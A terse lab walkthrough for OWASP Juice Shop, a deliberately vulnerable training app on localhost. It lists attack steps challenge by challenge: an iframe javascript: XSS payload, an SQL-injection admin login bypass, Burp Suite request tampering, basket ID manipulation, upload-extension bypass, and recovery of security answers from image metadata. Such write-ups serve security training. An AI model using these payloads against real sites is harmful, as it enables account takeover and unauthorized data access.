# OWASP Juice Shop<br>
## 1 STAR
### Score Board<br>
Firefox > Debugger > Search score > found: /score-board<br><br>

### Bully Chatbot<br>
Menu > Support Chat > Keep spamming coupon <br><br>

### DOM XSS<br>
search bar > <iframe src="javascript:alert(`xss`)"><br><br>

### Bonus Payload<br>
Search bar > <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe><br><br>

### Confidential Document<br>
http://localhost:3000/ftp > acquisitions.md<br><br>

### Error Handling<br>
Account Login > put ' in email and password fields<br><br>

### Exposed Metrics<br>
http://localhost:3000/metrics<br><br>

### Outdated Allowlist<br>
gospider -v -s http://127.0.0.1:3000/ -o gospider_output<br>
cd gospider_output
cat 127_0_0_1 | grep code-200<br><br>

### Missing Encoding<br>
change # to %23<br>
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg<br><br>

### Zero Stars<br>
http://localhost:3000/#/contact<br>
burp proxy > repeater > rating:0<br><br>

### Repetitive Registration<br>
http://localhost:3000/#/register<br>
burp proxy > repeater > passwordRepeat:""<br><br>

## 2 STAR
### Login Admin<br>
http://localhost:3000/#/login<br>
email:admin' or true--<br>
password:'<br><br>

### Admin Section<br>
http://localhost:3000/#/administration<br><br>

### Five-Star Feedback<br>
http://localhost:3000/#/administration<br>
delete button<br>

### Empty User Registration<br>
http://localhost:3000/#/login<br>
burp proxy > repeater > email:"",password:"",passwordRepeat:""<br><br>

### Empty User Registration<br>
email:mc.safesearch@juice-sh.op<br>
password:Mr. N00dles<br>

### Meta Geo Stalking<br>
http://localhost:3000/#/forgot-password<br>
exiftool favorite-hiking-place.png <br>
36°57’31.38″ N 84°20’53.58″ W <br>
burp suite > repeater<br>
email: john@juice-sh.op<br>
secret:Daniel Boone National Forest<br>

### Weird Crypto
hash analyzer > 4b2e6b2618920cb1713bb801cd05401e<br>
http://localhost:3000/#/contact <br>
Comment: md5 > submit <br>

### Visual Geo Stalking
http://localhost:3000/#/forgot-password<br>
http://localhost:3000/assets/public/images/uploads/IMG_4253.jpg<br>
email: emma@juice-sh.op<br>
secret: ITsec<br>

### View Basket
http://localhost:3000/#/basket<br>
burp suite > repeater<br>
GET /rest/basket/X HTTP/1.1 <br>

### Security Policy


## 3 STAR
### Upload type
http://localhost:3000/#/complain <br>
rename file extension to .zip or .pdf > uoload and submit<br>
burp suite > repeater > remove .zip to original extension<br>
Content-Disposition: form-data; name="file"; filename="legal.md.zip"<br>
